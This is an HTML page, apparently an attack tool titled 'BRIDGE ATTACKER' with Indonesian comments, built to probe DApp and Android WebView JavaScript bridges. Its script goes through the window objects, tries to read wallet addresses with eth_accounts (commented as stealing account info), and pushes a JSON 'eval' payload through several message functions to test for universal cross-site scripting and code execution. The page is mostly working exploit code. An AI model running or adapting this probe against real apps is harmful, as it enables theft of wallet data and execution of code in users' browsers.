<!DOCTYPE html>
<html>
<head>
    <title>DApp Bridge Hunter</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .log { border-bottom: 1px solid #333; padding: 5px 0; }
        .alert { color: #ff0000; font-weight: bold; }
        button { background: #00ff00; color: black; border: none; padding: 10px; width: 100%; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <h2>-- BRIDGE ATTACKER --</h2>
    <button onclick="startScan()">MULAI SCAN SEKARANG</button>
    <div id="console" style="margin-top: 20px;"></div>

    <script>
        function print(msg, isAlert = false) {
            const div = document.createElement('div');
            div.className = isAlert ? 'log alert' : 'log';
            div.innerHTML = `> ${msg}`;
            document.getElementById('console').prepend(div);
        }

        function startScan() {
            print("Memulai pemindaian objek window...");
            
            // Daftar objek standar yang kita abaikan
            const ignore = ['window', 'self', 'document', 'location', 'top', 'frames', 'history', 'navigator'];

            Object.keys(window).forEach(key => {
                // Cari objek yang bukan bawaan browser standar
                if (!ignore.includes(key) && window[key] !== null) {
                    print(`Menemukan Potensi Bridge: <b>${key}</b>`);

                    // 1. Coba curi info akun (Common di DApp Browser)
                    try {
                        if (window[key].request) {
                            window[key].request({method: 'eth_accounts'}).then(acc => {
                                print(`DATA BOCOR! Alamat Dompet: ${acc}`, true);
                            });
                        }
                    } catch(e) {}

                    // 2. Coba kirim payload UXSS (Jika ini jembatan Java Android)
                    const pocPayload = JSON.stringify({
                        type: 'eval',
                        code: 'alert("VULNERABLE: Bridge ' + key + ' bisa mengeksekusi kode!")'
                    });

                    try {
                        // Coba berbagai nama fungsi pengirim pesan
                        const methods = ['process', 'postMessage', 'call', 'send', 'sendMessage'];
                        methods.forEach(m => {
                            if (typeof window[key][m] === 'function') {
                                print(`Mencoba metode: ${key}.${m}()`);
                                window[key][m](pocPayload);
                            }
                        });
                    } catch(e) {}
                }
            });
        }
    </script>
</body>
</html>
